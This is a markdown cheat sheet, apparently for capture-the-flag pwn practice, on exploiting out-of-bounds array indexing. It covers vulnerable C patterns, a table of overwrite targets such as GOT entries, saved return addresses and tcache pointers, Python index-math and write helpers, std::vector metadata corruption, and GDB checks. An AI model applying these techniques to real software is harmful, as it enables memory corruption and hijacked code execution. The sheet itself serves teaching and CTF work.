# OOB Array

**When:** An array index operation (`arr[idx] = value)` or `arr[idx]`) has no bounds check, letting you read/write outside the array's memory. This gives an **arbitrary write/read primitive** if you can calculate the right index.

## Bug Shapes

```c
arr[idx] = value;              // no bounds check at all
arr[(unsigned)idx] = value;    // signed/unsigned confusion (negative idx wraps)
vec[idx] = value;              // vector operator[] unchecked
buf[i + base] = value;         // arithmetic bug lets i+base go negative/too large
```

## Targets

Pick your target based on protections:

| Protection               | Target                  | Strategy                        |
| ------------------------ | ----------------------- | ------------------------------- |
| No PIE, Partial RELRO    | GOT entry               | Overwrite GOT with `system`     |
| No PIE, Full RELRO       | Return address on stack | Overwrite saved RIP             |
| PIE + leak               | GOT or return address   | Use leak to compute target addr |
| Stack array, no canary   | Return address          | Negative index to saved RIP     |
| Heap array               | Adjacent chunk metadata | Corrupt tcache fd               |
| Struct with function ptr | The function ptr        | Overwrite with win/system       |

## Index Math

Given the array base address and the target address, compute the index:

```python
# For a long long array (8-byte elements)
idx = (target - array_base) // 8

# For a char/byte array
idx = target - array_base

# Negative index (before the array, e.g., to reach return address)
idx = -((array_base - target) // 8)

# Using the formula directly:
# arr[target_addr - arr_addr] = value
```

### Write helpers

```python
def write_qword(target, value):
    idx = (target - array_base) // 8
    edit(idx, value)

def write_byte(target, value):
    idx = target - array_base
    edit(idx, value)
```

## Heap OOB: Vector Metadata

C++ `std::vector` stores: `[start_ptr, end_ptr, capacity_ptr]`. An OOB on the vector data can overwrite the vector's own metadata if the vector is allocated adjacent to other data.

```python
# Overwrite vector's internal pointer to redirect next allocation
fake_chunk = elf.sym["target"] - 8   # -8 for malloc header
edit(num_slots_idx, 1)               # shrink size
edit(entries_idx, fake_chunk)        # redirect entries pointer
add(0x67)  # allocates on target address
```

## Known Address (No PIE)

When both the array and the target (e.g., GOT) are at known addresses, calculate the index directly:

```python
# Heap array, GOT at 0x404010
dis = -((heap_leak - 0x18a0 - 0x404010) // 8)
w(dis, win_addr)  # overwrite __gmon_start__ GOT with win()
```

## GDB Checks

```gdb
p/x &arr         # array base address
p/x &target      # target address (GOT entry, RSP, etc.)
x/20gx &arr      # view array contents
watch *(long long*)target  # break when target changes
```
